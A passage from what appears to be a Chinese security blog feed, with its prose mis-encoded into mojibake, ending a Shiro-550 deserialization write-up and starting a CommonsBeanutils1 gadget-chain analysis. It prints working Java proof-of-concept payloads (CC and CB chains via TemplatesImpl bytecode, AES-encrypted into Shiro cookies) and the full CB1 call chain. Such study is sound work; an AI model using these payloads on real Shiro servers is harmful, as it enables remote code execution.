å¤ç°</h3><p>shiro1.2.4ä¸­é»˜è®¤æ˜¯å¸¦æœ‰commons-collection3.2.1çš„ï¼Œä½†è¿™ä¸ªåŒ…çš„ä½œç”¨èŒƒå›´æ˜¯testï¼Œè¿™é‡Œæš‚æ—¶å…ˆä¸ç®¡ï¼Œå°±å…ˆç”¨CCé“¾è¿›è¡Œå¤ç°</p><p>æ‰€ä»¥å°±éœ€è¦å‘ä¾èµ–ä¸­æ·»åŠ commons-collection3.2.1çš„ä¾èµ–</p><p>ç­‰ä¸‹å†å­¦ä¹ æ— ä¾èµ–çš„æ–¹å¼</p><h4 id="æ·»åŠ ä¾èµ–"><a href="#æ·»åŠ ä¾èµ–" class="headerlink" title="æ·»åŠ ä¾èµ–"></a>æ·»åŠ ä¾èµ–</h4><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/31.png"></p><h4 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h4><h5 id="æ³¨æ„1"><a href="#æ³¨æ„1" class="headerlink" title="æ³¨æ„1"></a>æ³¨æ„1</h5><p>è¿™é‡Œæœ‰ä¸€ä¸ªç‚¹éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œä¼ ç»Ÿçš„CCé“¾ä¸å¤ªèƒ½ç”¨ï¼Œå› ä¸ºæ­¤æ—¶<strong>æ— æ³•åŠ è½½æ•°ç»„ç±»</strong>ï¼Œæ¯”å¦‚æ‹¿CC6ä¸¾ä¾‹</p><p>åœ¨<code>org.apache.shiro.util.ClassUtils#forName</code>å¤„èƒ½å¤Ÿçœ‹å‡º</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/32.png"></p><p>åœ¨ç»è¿‡ä¸‰ä¸ªç±»åŠ è½½å™¨<code>getContextClassLoader()</code>â€”&gt;<code>ClassLoader</code>â€”&gt;<code>system/application ClassLoader</code>åŠ è½½ä¹‹å calzzä»ç„¶ä¸ºç©ºï¼Œå°±å¯¼è‡´ä½¿ç”¨æ•°ç»„çš„CCä¸èƒ½ä½¿ç”¨ï¼Œæ‰€ä»¥éœ€è¦æ”¹ä¸€æ”¹</p><p>æœ€ç»ˆä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    <span class="hljs-comment">// æ³¨æ„:ç”±äºtomcatæ— æ³•è§£æå¯¹è±¡æ•°ç»„ï¼Œæ‰€ä»¥å¯¼è‡´Transformer[]æ— æ³•ä½¿ç”¨ï¼Œæ”¹ä¸€ä¸‹è·¯å­å³å¯</span><br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>    Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>    Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    name.setAccessible(<span class="hljs-keyword">true</span>);<br>    name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>    Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>    <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>    bytecodes.set(templates,b);<br><br>    InvokerTransformer newTransformer = <span class="hljs-keyword">new</span> InvokerTransformer(<span class="hljs-string">&quot;newTransformer&quot;</span>, <span class="hljs-keyword">null</span>, <span class="hljs-keyword">null</span>);<br><br>    HashMap&lt;Object, Object&gt; map = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    Map lazyMap = LazyMap.decorate(map,<span class="hljs-keyword">new</span> ConstantTransformer(<span class="hljs-string">&quot;q&quot;</span>));<br><br>    TiedMapEntry tiedMapEntry = <span class="hljs-keyword">new</span> TiedMapEntry(lazyMap, templates);<br><br>    HashMap&lt;Object, Object&gt; hashMap = <span class="hljs-keyword">new</span> HashMap&lt;&gt;();<br>    hashMap.put(tiedMapEntry,<span class="hljs-string">&quot;222&quot;</span>);<br>    lazyMap.remove(templates);<br><br>    Class aClass = LazyMap.class;<br>    Field factory = aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>    factory.setAccessible(<span class="hljs-keyword">true</span>);<br>    factory.set(lazyMap,newTransformer);<br>    <span class="hljs-comment">//        serialize(hashMap);</span><br>    <span class="hljs-comment">//        deserialize();</span><br><br>    String enc = enc(getFile());<br>    System.out.print(enc);<br><br>&#125;<br><br><span class="hljs-comment">// AES_CBCåŠ å¯† ä½¿ç”¨çš„shiroåŸç”Ÿçš„åŠ å¯†ï¼Œéœ€è¦å¼•å…¥shiroçš„åŒ…</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> String <span class="hljs-title">enc</span><span class="hljs-params">(<span class="hljs-keyword">byte</span>[] data)</span></span>&#123;<br>    CipherService cipherService = <span class="hljs-keyword">new</span> AesCipherService();<br>    <span class="hljs-keyword">byte</span>[] key = Base64.decode(KEY);<br>    ByteSource encrypt = cipherService.encrypt(data, key);<br>    <span class="hljs-keyword">byte</span>[] bytes = encrypt.getBytes();<br>    String s = Base64.encodeToString(bytes);<br>    <span class="hljs-keyword">return</span> s;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/33.png"></p><h3 id="0x04-æ— ä¾èµ–é“¾POC"><a href="#0x04-æ— ä¾èµ–é“¾POC" class="headerlink" title="0x04 æ— ä¾èµ–é“¾POC"></a>0x04 æ— ä¾èµ–é“¾POC</h3><p>shiro1.2.4é»˜è®¤æ˜¯å¸¦æœ‰commons-beanutils1.8.3çš„ï¼Œæ‰€ä»¥ä¹Ÿå°±æ˜¯åˆ©ç”¨shiroè‡ªå¸¦çš„ä¸œè¥¿è¿›è¡Œä¸€ä¸ªåˆ©ç”¨</p><p>å‰é¢å·²ç»çœ‹è¿‡CBé“¾äº†ï¼Œæ‰€ä»¥è¿™é‡Œå¯ä»¥ç›´æ¥å°è¯•ä¸€ä¸‹ç”¨åŸç”Ÿçš„CBé“¾è¿›è¡Œä¸€ä¸ªåˆ©ç”¨ï¼Œç»“æœå°±æ˜¯ç›´æ¥å¯„ğŸ˜­</p><h4 id="é—®é¢˜ä¸€"><a href="#é—®é¢˜ä¸€" class="headerlink" title="é—®é¢˜ä¸€"></a>é—®é¢˜ä¸€</h4><p>ç›´æ¥ä½¿ç”¨åŸæ¥çš„CBé“¾ï¼Œä¼šçˆ†å‡ºå¦‚ä¸‹é”™è¯¯</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/35.png"></p><p>å…¶åŸå› æ˜¯<code>org.apache.commons.collections.comparators.ComparableComparator</code>æ˜¯CCåŒ…é‡Œé¢çš„</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/36.png"></p><p>åŸæ¥é“¾ä½¿ç”¨çš„åœ°æ–¹æ˜¯åœ¨<code>new BeanComparator()</code>ä¼šè°ƒç”¨<code>ComparableComparator.getInstance()</code></p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/37.png"></p><p>æ‰€ä»¥éœ€è¦æ›´æ”¹ä¸€ä¸‹pocï¼Œæ›´æ”¹<code>new BeanComparator()</code>å¤„ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">BeanComparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> AttrCompare());<br></code></pre></td></tr></table></figure><h4 id="é—®é¢˜äºŒ"><a href="#é—®é¢˜äºŒ" class="headerlink" title="é—®é¢˜äºŒ"></a>é—®é¢˜äºŒ</h4><p>ä¸Šé¢æ›´æ”¹å®Œä¹‹ååˆä¼šå‡ºç°ç¬¬äºŒä¸ªé—®é¢˜</p><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/38.png"></p><p>å…¶åŸå› ä¹Ÿå°±æ˜¯<code>SerializableID</code>çš„ä½œç”¨ï¼šè®©è¿™ä¸ªå¯¹è±¡æœ‰å”¯ä¸€çš„æ ‡è¯†ï¼åºåˆ—åŒ–å’Œååºåˆ—è¯è¦ä¿æŒç‰ˆæœ¬ä¸€è‡´ï¼</p><p>æ”¹ä¸€ä¸‹commons-beanutilsçš„ç‰ˆæœ¬ï¼Œéœ€è¦è·Ÿshiroå†…ç½®çš„ç‰ˆæœ¬ä¸€æ ·ï¼Œä¹Ÿå°±æ˜¯commons-beanutils1.8.3</p><h4 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h4><p>æ‰€ä»¥æœ€ç»ˆçš„pocå¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception</span>&#123;<br>    <span class="hljs-comment">// æ— ä¾èµ–çš„æƒ…å†µä¸‹ï¼Œé¦–å…ˆä½¿ç”¨çš„å°±æ˜¯CBé“¾ï¼Œå› ä¸ºshiroé»˜è®¤æ˜¯è‡ªå¸¦commons-beanutils1.8.3</span><br>    TemplatesImpl templates = <span class="hljs-keyword">new</span> TemplatesImpl();<br>    Class&lt;TemplatesImpl&gt; templatesClass = TemplatesImpl.class;<br>    Field name = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_name&quot;</span>);<br>    name.setAccessible(<span class="hljs-keyword">true</span>);<br>    name.set(templates,<span class="hljs-string">&quot;zzz&quot;</span>);<br><br>    Field bytecodes = templatesClass.getDeclaredField(<span class="hljs-string">&quot;_bytecodes&quot;</span>);<br>    bytecodes.setAccessible(<span class="hljs-keyword">true</span>);<br>    <span class="hljs-keyword">byte</span>[][] b = &#123;classBytes()&#125;;<br>    bytecodes.set(templates,b);<br><br>    BeanComparator comparator = <span class="hljs-keyword">new</span> BeanComparator(<span class="hljs-string">&quot;outputProperties&quot;</span>,<span class="hljs-keyword">new</span> AttrCompare());<br>    PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> PriorityQueue&lt;&gt;(<span class="hljs-number">2</span>,comparator);<br><br>    Field queues = queue.getClass().getDeclaredField(<span class="hljs-string">&quot;queue&quot;</span>);<br>    queues.setAccessible(<span class="hljs-keyword">true</span>);<br>    Object[] queueArray = (Object[])queues.get(queue);<br>    queueArray[<span class="hljs-number">0</span>] = templates;<br>    queueArray[<span class="hljs-number">1</span>] = <span class="hljs-keyword">null</span>;<br><br>    Field size = queue.getClass().getDeclaredField(<span class="hljs-string">&quot;size&quot;</span>);<br>    size.setAccessible(<span class="hljs-keyword">true</span>);<br>    size.set(queue,<span class="hljs-number">2</span>);<br><br>    serialize(queue);<br>    <span class="hljs-comment">//   deserialize();</span><br><br>    String enc = enc(getFile());<br>    System.out.print(enc);<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/11/05/shiro550%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/39.png"></p><h3 id="0x05-æ€»ç»“"><a href="#0x05-æ€»ç»“" class="headerlink" title="0x05 æ€»ç»“"></a>0x05 æ€»ç»“</h3><p>shiro550è¿™ä¸ªæ¼æ´åŸç†è¿˜æ˜¯å¾ˆç®€å•çš„ï¼šåŸç”Ÿåºåˆ—åŒ–-AESåŠ å¯†-Base64ç¼–ç ï¼Œå…¶ä»–çš„å€’æ²¡æœ‰ä»€ä¹ˆäº†ï¼Œä½†è¿˜æ˜¯æœ‰ä¸€äº›å°å°çš„å‘ç‚¹ï¼Œæ¯”å¦‚æ— æ³•åŠ è½½å¯¹è±¡æ•°ç»„ã€ä¾èµ–é—®é¢˜ç­‰ã€‚ç®€å•å½’ç®€å•ï¼Œä½†è®©æˆ‘è‡ªå·±å‘ç°ç¡®å®æœ‰ç‚¹éš¾ğŸ˜­ï¼Œè†œæ‹œå¤§ä½¬ã€‚</p><h3 id="0x06-å‚è€ƒé“¾æ¥"><a href="#0x06-å‚è€ƒé“¾æ¥" class="headerlink" title="0x06 å‚è€ƒé“¾æ¥"></a>0x06 å‚è€ƒé“¾æ¥</h3><ul><li><a href="https://www.bilibili.com/video/BV1iF411b7bD/?spm_id_from=333.999.0.0&vd_source=db93b94230228cb739b48f4f59e74abd">Shiroååºåˆ—åŒ–æ¼æ´(ä¸€)-shiro550æµç¨‹åˆ†æ</a></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>Javaå®‰å…¨</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CommonsBeanutils1</title>
    <link href="/2022/10/29/CommonsBeanutils1/"/>
    <url>/2022/10/29/CommonsBeanutils1/</url>
    
    <content type="html"><![CDATA[<h2 id="CommonsBeanutils1"><a href="#CommonsBeanutils1" class="headerlink" title="CommonsBeanutils1"></a>CommonsBeanutils1</h2><h3 id="0x00-å‰è¨€"><a href="#0x00-å‰è¨€" class="headerlink" title="0x00 å‰è¨€"></a>0x00 å‰è¨€</h3><p>è¿˜æ˜¯é‚£äº›è°ƒç”¨é“¾ï¼Œæœ‰å‡ ä¸ªç»å…¸çš„éœ€è¦åˆ†æåˆ†æçœ‹ä¸€çœ‹ï¼ŒCBé“¾å°±æ˜¯å…¶ä¸­ä¹‹ä¸€</p><h4 id="ç¯å¢ƒ"><a href="#ç¯å¢ƒ" class="headerlink" title="ç¯å¢ƒ"></a>ç¯å¢ƒ</h4><p>jdk 8u71/8u341</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>commons-beanutils<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>1.9.2<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h3 id="0x01-è°ƒç”¨é“¾åˆ†æ"><a href="#0x01-è°ƒç”¨é“¾åˆ†æ" class="headerlink" title="0x01 è°ƒç”¨é“¾åˆ†æ"></a>0x01 è°ƒç”¨é“¾åˆ†æ</h3><p>å…ˆæ¥ç…ä¸€çœ¼<code>ysoserial</code>çš„ï¼Œä»–å–µçš„ï¼Œæ²¡æœ‰å†™è°ƒç”¨é“¾ï¼Œé‚£åªå¥½è‡ªå·±æ¥äº†ğŸ˜’ï¼Œå®˜æ–¹é‚£é‡Œå†™çš„ä¹Ÿå¾ˆçŸ­ï¼Œåº”è¯¥ä¸éš¾ï¼Œä½†æ„¿èƒ½ä¸€æ­¥åˆ†æå‡ºæ¥</p><h4 id="å±é™©æ–¹æ³•"><a href="#å±é™©æ–¹æ³•" class="headerlink" title="å±é™©æ–¹æ³•"></a>å±é™©æ–¹æ³•</h4><p>æ‰¾äº†ä¸€åœˆ(æ ¹æ®å¤§ä½¬çš„ä»£ç æ‰¾äº†ä¸€åœˆ)ï¼Œå‘ç°åœ¨<code>org.apache.commons.beanutils.PropertyUtilsBean#getSimpleProperty</code>æœ‰ä¸€ä¸ªä»»æ„æ–¹æ³•è°ƒç”¨ï¼Œä»»æ„getteræ–¹æ³•è°ƒç”¨</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getSimpleProperty</span><span class="hljs-params">(Object bean, String name)</span><span class="hljs-keyword">throws</span> IllegalAccessException, </span><br><span class="hljs-function">InvocationTargetException,NoSuchMethodException </span>&#123;<br>    ...<span class="hljs-comment">// beanå’Œname ä¸èƒ½ä¸ºç©º</span><br><br>    <span class="hljs-comment">// Validate the syntax of the property nameéªŒè¯å±æ€§åç§°çš„è¯­æ³•</span><br>    <span class="hljs-keyword">if</span> (resolver.hasNested(name)) &#123;<br>        ...<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (resolver.isIndexed(name)) &#123;<br>        ...<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (resolver.isMapped(name)) &#123;<br>        ...<br>    &#125;<br><br>    <span class="hljs-comment">// bean æ˜¯å¦æ˜¯ DynaBeançš„å®ä¾‹</span><br>    <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> DynaBean) &#123;<br>        ...&#125;<br>    <br>    <span class="hljs-comment">// Retrieve the property getter method for the specified property æ£€ç´¢æŒ‡å®šå±æ€§çš„å±æ€§getteræ–¹æ³•</span><br>    <span class="hljs-comment">// æ£€æŸ¥beanä¸­æ˜¯å¦å­˜åœ¨åç§°ä¸ºnameçš„getæ–¹æ³•</span><br>    PropertyDescriptor descriptor = getPropertyDescriptor(bean, name);<br>    <span class="hljs-keyword">if</span> (descriptor == <span class="hljs-keyword">null</span>) &#123;<br>         ...&#125;<br>    <span class="hljs-comment">// è·å–è¯¥get+name æ–¹æ³•</span><br>    Method readMethod = getReadMethod(bean.getClass(), descriptor);<br>    <span class="hljs-keyword">if</span> (readMethod == <span class="hljs-keyword">null</span>) &#123;<br>        ...&#125;<br><br>    <span class="hljs-comment">// Call the property getter and return the value è°ƒç”¨è¯¥getteræ–¹æ³•</span><br>    Object value = invokeMethod(readMethod, bean, EMPTY_OBJECT_ARRAY);<br>    <span class="hljs-keyword">return</span> (value);<br>&#125;<br></code></pre></td></tr></table></figure><p>æœ‰äº†è¿™ä¸ªgetteræ–¹æ³•ï¼Œæ¥ä¸‹æ¥å°±æ˜¯æ‰¾åˆ°ä¸€ä¸ªåœ¨getteræ–¹æ³•ä¸­è°ƒç”¨äº†ä¸€äº›å¯ä»¥æ‰§è¡Œä»£ç æˆ–é—´æ¥æ‰§è¡Œä»£ç çš„ä¸œè¥¿ï¼Œç„¶åï¼Œå°±æ¥åˆ°äº†</p><p><code>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> Properties <span class="hljs-title">getOutputProperties</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> newTransformer().getOutputProperties();<span class="hljs-comment">// è°ƒç”¨newTransformer(),è¿™ä¸å°±æ˜¯ä»¥å‰çš„è°ƒç”¨é“¾å˜›</span><br>    &#125;<br>    ...<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="è°ƒç”¨é“¾"><a href="#è°ƒç”¨é“¾" class="headerlink" title="è°ƒç”¨é“¾"></a>è°ƒç”¨é“¾</h4><p>ä¸Šé¢çŸ¥é“åœ¨<code>org.apache.commons.beanutils.PropertyUtilsBean#getSimpleProperty</code>å¯ä»¥è°ƒç”¨ä»»æ„çš„getteræ–¹æ³•</p><p><code>getSimpleProperty(Object bean, String name)</code>è¦æ±‚å‚æ•°å¯æ§</p><p>æ¥ä¸‹æ¥å°±æ˜¯ä¸€æ­¥æ­¥æ‰¾åˆ°readObjectï¼ŒAlt+F7ï¼Œé‚£ä¹ˆå¤šé€‰æ‹©åªèƒ½ä¸€ä¸ªä¸ªçœ‹ï¼Œæˆ–è€…æ ¹æ®å¤§ä½¬çš„æ¥</p><p><img src="/2022/10/29/CommonsBeanutils1/1.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getNestedProperty</span><span class="hljs-params">(Object bean, String name)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, </span><br><span class="hljs-function">InvocationTargetException,NoSuchMethodException </span>&#123;<br>    ...<br><br>    <span class="hljs-comment">// Resolve nested referencesè§£æåµŒå¥—å¼•ç”¨</span><br>    <span class="hljs-keyword">while</span> (resolver.hasNested(name)) &#123;<br>        ...&#125;<br><br>    <span class="hljs-keyword">if</span> (bean <span class="hljs-keyword">instanceof</span> Map) &#123;<span class="hljs-comment">// beanæ˜¯å¦å±äºMapæˆ–è€…Mapå­ç±»çš„å®ä¾‹</span><br>        bean = getPropertyOfMapBean((Map&lt;?, ?&gt;) bean, name);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (resolver.isMapped(name)) &#123;<span class="hljs-comment">// åˆ¤æ–­nameä¸­æ˜¯å¦æœ‰ (</span><br>        bean = getMappedProperty(bean, name);<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (resolver.isIndexed(name)) &#123;  <span class="hljs-comment">// åˆ¤æ–­nameä¸­æ˜¯å¦æœ‰ [</span><br>        bean = getIndexedProperty(bean, name);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        bean = getSimpleProperty(bean, name);<span class="hljs-comment">// å°±æ˜¯è¿™äº†ï¼Œbeanå’Œnameæ˜¯ä¼ è¿›æ¥çš„ï¼Œæ‰€ä»¥æš‚æ—¶å¯æ§</span><br>    &#125;<br>    <span class="hljs-keyword">return</span> bean;<br>&#125;<br></code></pre></td></tr></table></figure><p>ç»§ç»­å‘ä¸Šæ‰¾</p><p><img src="/2022/10/29/CommonsBeanutils1/2.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> Object <span class="hljs-title">getProperty</span><span class="hljs-params">(Object bean, String name)</span> <span class="hljs-keyword">throws</span> IllegalAccessException, </span><br><span class="hljs-function">InvocationTargetException, NoSuchMethodException </span>&#123;<br>    <span class="hljs-keyword">return</span> (getNestedProperty(bean, name));<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥åˆ°<code>org.apache.commons.beanutils.PropertyUtils#getProperty</code></p><p><img src="/2022/10/29/CommonsBeanutils1/3.png"></p><p>æ¥åˆ°<code>org.apache.commons.beanutils.BeanComparator#compare</code></p><p><img src="/2022/10/29/CommonsBeanutils1/4.png"></p><p>åˆ°è¿™é‡Œï¼Œå°±èƒ½å¤Ÿå‘ç°ï¼Œä»–å¥½åƒåˆå›åˆ°äº†å‰é¢çš„<code>PriorityQueue#readObject</code>è¿™é‡Œäº†ï¼Œä¹Ÿå°±æ˜¯åˆç”¨äº†åŸæ¥çš„CCä¸­çš„å…¥å£ç‚¹ï¼Œåªä¸è¿‡ä¸­é—´éƒ¨åˆ†ä½¿ç”¨çš„æ˜¯<code>CommonsBeanutils</code>éƒ¨åˆ†çš„ä¸œè¥¿ï¼Œæ‰€ä»¥å¤§è‡´çš„é“¾å­å°±æ˜¯è¿™ä¸ªæ ·å­äº†</p><blockquote><p>java.util.PriorityQueue#readObject<br>java.util.PriorityQueue#heapify<br>java.util.PriorityQueue#siftDown<br>java.util.PriorityQueue#siftDownUsingComparator<br>org.apache.commons.beanutils.BeanComparator#compare<br>org.apache.commons.beanutils.PropertyUtils#getProperty<br>org.apache.commons.beanutils.PropertyUtilsBean#getProperty<br>org.apache.commons.beanutils.PropertyUtilsBean#getNestedProperty<br>org.apache.commons.beanutils.PropertyUtilsBean#getSimpleProperty<br>org.apache.commons.beanutils.PropertyUtilsBean#invokeMethod<br>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputProperties<br>com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformer</p></blockquote><h3 id="0x02-POC"><a href="#0x02-POC" class="headerlink" title="0x02 POC"></a>0x02 POC</h3><p>æµç¨‹åˆ†ææ¸…æ¥šä¹‹åï¼Œæ¥ä¸‹æ¥çš„å°±æ˜¯å†™ä»£ç äº†ï¼Œç›´æ¥ä»<code>PriorityQueue#siftDownUsingComparator</code>å¼€å§‹çœ‹</p><p><img src="/2022/10/29/CommonsBeanutils1/5.png"></p><ul><li><code>comparator</code> éœ€è¦æ˜¯ <code>BeanComparator</code>çš„ä¸€ä¸ªå®ä¾‹å¯¹è±¡</li><li>x éœ€è¦æ˜¯ TemplateImplçš„ä¸€ä¸ªå®ä¾‹å¯¹è±¡ï¼Œcæš‚æ—¶æ— æ‰€è°“</li></ul><h4 id="é—®é¢˜ç‚¹1"><a href="#é—®é¢˜ç‚¹1" class="headerlink" title="é—®é¢˜ç‚¹1"></a>é—®é¢˜ç‚¹1</h4><p>å°†pocåˆ†æ­¥å»å†™ï¼Œæ‰€ä»¥å‰é¢çš„pocå°±æ˜¯å¦‚ä¸‹å½¢å¼</p><p><img src="/2022/10/29/CommonsBeanutils1/6.png"></p><p>ä½†è¿™æ ·æœ‰ä¸ªé—®é¢˜æ˜¯ï¼Œæ­¤æ—¶çš„queueçš„å€¼ä¸ºç©ºï¼Œè¿™ä¸ªå€¼æ˜¯åé¢çš„<code>comparator.compare(x, (E) c)</code>ï¼Œä¸­çš„xï¼Œæ‰€ä»¥éœ€è¦æ›´æ”¹è¿™ä¸ªxçš„å€¼</p><p><img src="/2022/10/29/CommonsBeanutils1/7.png"></p><p>ç”±ä¸Šé¢çŸ¥é“ï¼Œxçš„å€¼æ¥æºäºqueue[i]ï¼Œä¹Ÿå°±æ˜¯queueæ•°ç»„é‡Œé¢çš„å†…å®¹ï¼Œæ‰€ä»¥éœ€è¦æ›´æ”¹è¿™ä¸ªæ•°ç»„ä¸­çš„å†…å®¹ï¼Œæ¥çœ‹ä¸€ä¸‹queueçš„èµ‹å€¼å’Œåˆå§‹åŒ–</p><p>åœ¨å…¶æ„é€ å™¨ä¸­ï¼Œæœ‰ä¸ªæ„é€ 